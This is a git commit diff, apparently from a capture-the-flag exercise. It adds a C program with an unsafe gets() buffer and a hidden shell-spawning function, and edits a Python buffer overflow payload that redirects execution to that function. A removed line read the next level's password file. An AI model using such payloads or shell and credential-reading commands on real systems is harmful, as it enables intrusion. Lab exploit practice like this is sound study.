99f6bc999140b1f5229f593046333d8a079911d9
LIMachi <lee.mach.hm@gmai.com>
2024-11-27 18:28:54 +0100

    level1 almost finished

---
+++ level1/Ressources/main.c
@@ -0,0 +1,12 @@
+#include <stdio.h>
+
+int run()
+{
+    fwrite("Good... Wait what?\n", 1, 19, stdout);
+    return system("/bin/sh");
+}
+
+int main() {
+    char buff[0x44];
+    return gets(buff);
+}
--- level1/ressources/script.py
+++ level1/ressources/script.py
@@ -1,17 +1,21 @@
 import struct
-
 # Addresses
 system_addr = 0x8048360  # Address of system@plt
-cmd_addr = 0xbffff6f0    # Address where the command will be in the buffer
+cmd_addr = 0xbffff738   # Address where the command will be in the buffer
+cmd_addr = 0x08048464
 
 # Construct payload
-payload = b"A" * 80       # Fill buffer
-payload += b"B" * 4       # Overwrite saved EBP
-payload += struct.pack("<I", system_addr)  # Address of system@plt
-payload += struct.pack("<I", 0x0)         # Dummy return address for system (can be 0)
+payload = b"A" * 76       # Fill buffer
+# payload += struct.pack("<I", system_addr)  # Address of system@plt
+# payload += struct.pack("<I", 0x0)         # Dummy return address for system (can be 0)
 payload += struct.pack("<I", cmd_addr)    # Argument to system (address of the command)
 
 # Append the command
-payload += b"cat /home/user/level2/.pass\x00"
+# payload += b"/bin/sh"
+# print(payload)
 
-print(payload)
+# pyperclip.copy(payload)
+
+f = open("/tmp/test", "wb")
+f.write(payload)
+f.close()
